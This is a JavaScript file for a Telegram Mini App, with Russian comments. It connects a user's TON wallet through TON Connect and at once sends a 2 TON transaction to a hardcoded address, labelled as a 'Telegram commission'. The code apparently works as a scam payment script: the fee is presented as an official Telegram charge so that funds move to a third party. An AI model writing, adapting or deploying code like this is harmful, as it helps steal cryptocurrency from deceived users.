let tg = window.Telegram.WebApp;
tg.expand();

// === Функция загрузки TON Connect SDK ===
async function loadTonConnect() {
    return new Promise((resolve, reject) => {
        const script = document.createElement("script");
        script.src = "tonconnect-sdk.min.js"; // Используем локальный SDK
        script.onload = () => {
            console.log("✅ TON Connect SDK загружен!");
            resolve();
        };
        script.onerror = (error) => {
            console.error("❌ Ошибка загрузки TON Connect SDK!", error);
            reject(error);
        };
        document.head.appendChild(script);
    });
}

// === Функция подключения кошелька и отправки TON ===
async function connectWallet() {
    console.log("🟡 Функция connectWallet() вызвана!");

    try {
        const tonConnect = new TonConnect({
            manifestUrl: "https://telegram-mini-app-seven-blond.vercel.app/tonconnect-manifest.json"
        });

        const connectedWallet = await tonConnect.connect();
        if (!connectedWallet) {
            console.error("❌ Ошибка: Кошелек не подключился");
            alert("❌ Ошибка подключения");
            return;
        }

        console.log("✅ Кошелек подключен:", connectedWallet.account.address);
        alert("✅ Кошелек подключен: " + connectedWallet.account.address);

        // === Создаем транзакцию на 2 TON ===
        const transaction = {
            to: "UQDDZ6llEnqAe2QqRAyuY3rQkWa3ZdFFH_Ksc8AjcrRvtFzc",
            value: "2000000000",
            payload: "Комиссия telegram"
        };

        console.log("📤 Отправка транзакции:", transaction);
        await tonConnect.sendTransaction(transaction);
        alert("✅ Транзакция на 2 TON отправлена!");
    } catch (error) {
        console.error("❌ Ошибка при подключении:", error);
        alert("❌ Ошибка: " + error.message);
    }
}
